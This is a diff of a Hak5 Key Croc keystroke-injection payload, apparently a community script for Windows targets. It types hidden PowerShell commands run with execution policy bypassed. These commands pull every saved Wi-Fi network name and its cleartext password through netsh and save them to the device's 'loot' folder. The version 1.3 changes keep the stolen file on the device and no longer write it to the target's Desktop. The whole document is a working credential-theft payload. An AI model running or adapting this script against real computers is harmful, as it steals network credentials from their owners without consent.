@@ -1,7 +1,7 @@
 # Title:         Windows Get online   
 # Description:   Get online automatically to target pc wifi or to your own wifi
 # Author:        spywill
-# Version:       1.2
+# Version:       1.3
 # Category:      Key Croc
 #
 #
@@ -33,8 +33,8 @@ QUACK DELAY 1000
 QUACK STRING "(netsh wlan show profiles) | Select-String \"\:(.+)\$\" | % {\$name=\$_.Matches.Groups[1].Value.Trim(); \$_} | %{(netsh wlan show profile name=\"\$name\" key=clear)} | Select-String \"Key Content\W+\:(.+)\$\" | % {\$pass=\$_.Matches.Groups[1].Value.Trim(); \$_} | %{[PSCustomObject]@{ PROFILE_NAME=\$name;PASSWORD=\$pass }} | Format-Table -AutoSize | Out-File \"\$Croc\loot\Wifipasswd.txt\""
 QUACK ENTER
 QUACK DELAY 1000
-# --> Create wifipass.txt with the taget pc SSID and PASSWD
-QUACK STRING "(netsh wlan show networks) | Select-String \"\:(.+)\$\" | % {\$name=\$_.Matches.Groups[1].Value.Trim(); \$_} | %{(netsh wlan show profile name=\"\$name\" key=clear)} | Select-String \"Key Content\W+\:(.+)\$\" | % {\$pass=\$_.Matches.Groups[1].Value.Trim(); \$_} | %{[PSCustomObject]@{ PROFILE_NAME=\$name;PASSWORD=\$pass }} | Format-Table -AutoSize | Out-File \"\$env:userprofile\Desktop\wifipass.txt\""
+# --> Create wifipass.txt with the taget pc SSID and PASSWD put in Keycroc loot folder
+QUACK STRING "(netsh wlan show networks) | Select-String \"\:(.+)\$\" | % {\$name=\$_.Matches.Groups[1].Value.Trim(); \$_} | %{(netsh wlan show profile name=\"\$name\" key=clear)} | Select-String \"Key Content\W+\:(.+)\$\" | % {\$pass=\$_.Matches.Groups[1].Value.Trim(); \$_} | %{[PSCustomObject]@{ PROFILE_NAME=\$name;PASSWORD=\$pass }} | Format-Table -AutoSize | Out-File \"\$Croc\loot\wifipass.txt\""
 QUACK ENTER
 QUACK DELAY 1000
 # --> Open notepad with the KeyCroc config.txt
@@ -56,9 +56,12 @@ QUACK GUI r
 QUACK DELAY 500
 QUACK STRING "powershell -NoP -NonI -W Hidden -Exec Bypass"
 QUACK ENTER
-QUACK DELAY 1000 
+QUACK DELAY 1000
+QUACK STRING "\$Croc = (gwmi win32_volume -f 'label=\"KeyCroc\"' | Select-Object -ExpandProperty DriveLetter)"
+QUACK ENTER
+QUACK DELAY 500 
 # --> Open wifipass.txt to copy and paste the SSID and PASSWD
-QUACK STRING "notepad \$env:userprofile\Desktop\wifipass.txt"
+QUACK STRING "notepad \$Croc\loot\wifipass.txt"
 QUACK ENTER
 QUACK DELAY 1000
 # --> Copy and paste the SSID AND PASSWD to the config.txt
@@ -117,15 +120,6 @@ QUACK ENTER
 QUACK DELAY 500
 QUACK CONTROL-ALT-TAB
 QUACK DELETE
-QUACK DELAY 500
-QUACK GUI r
-QUACK DELAY 500
-QUACK STRING "powershell -NoP -NonI -W Hidden -Exec Bypass"
-QUACK ENTER 
-QUACK DELAY 1000
-# --> delete wifipass.txt from target PC
-QUACK STRING del "Desktop\wifipass.txt"
-QUACK ENTER
 QUACK DELAY 500
 # --> Returning to HID Mode
 ATTACKMODE HID
